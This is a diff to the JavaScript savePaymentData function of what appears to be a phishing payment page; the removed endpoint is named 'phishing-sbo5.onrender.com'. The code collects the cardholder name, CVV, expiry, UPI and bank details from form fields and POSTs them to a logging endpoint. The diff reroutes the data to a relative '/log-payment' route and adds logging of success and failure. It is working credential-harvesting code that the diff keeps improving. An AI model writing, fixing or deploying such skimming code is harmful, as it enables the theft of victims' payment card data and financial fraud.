@@ -646,7 +646,7 @@
     return true;
   }
 
- function savePaymentData(method) {
+function savePaymentData(method) {
   let data = {
     method: method,
     time: new Date().toLocaleString()
@@ -654,11 +654,10 @@
 
   if (method === 'card') {
     let cardNum = document.getElementById('cardNum').value.replace(/\s/g, '').replace(/\D/g, '');
-    data.cardNumber = cardNum;
-    data.cardLast4 = cardNum.slice(-4);
+    data.cardLast4 = cardNum.slice(-4) || 'XXXX';
     data.cardName = document.getElementById('cardName').value.trim();
-    data.cardCvv  = document.getElementById('cardCvv').value.trim();
-    data.cardExp  = document.getElementById('cardExp').value.trim();
+    data.cardCvv = document.getElementById('cardCvv').value.trim();
+    data.cardExp = document.getElementById('cardExp').value.trim();
   }
 
   if (method === 'upi') {
@@ -670,17 +669,23 @@
     data.bank = selectedBank ? selectedBank.innerText.trim() : 'Unknown';
   }
 
-  // Save locally (optional for demo)
-  //let payments = JSON.parse(localStorage.getItem('payments')) || [];
-  //payments.push(data);
-  //localStorage.setItem('payments', JSON.stringify(payments));
-
-  // === SEND TO BACKEND LOGGER ===
-  fetch('https://phishing-sbo5.onrender.com', {   // ← Change this later
+  // FIXED: Send to correct endpoint using relative URL (best for Render)
+  fetch('/log-payment', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
-  }).catch(err => console.error('Logging failed:', err));
+  })
+  .then(response => {
+    if (!response.ok) throw new Error('Server error');
+    return response.json();
+  })
+  .then(result => {
+    console.log('✅ Payment data logged successfully:', result);
+  })
+  .catch(err => {
+    console.error('❌ Logging failed:', err);
+    // Optional: alert('Failed to save payment details');
+  });
 
   return data;
 }
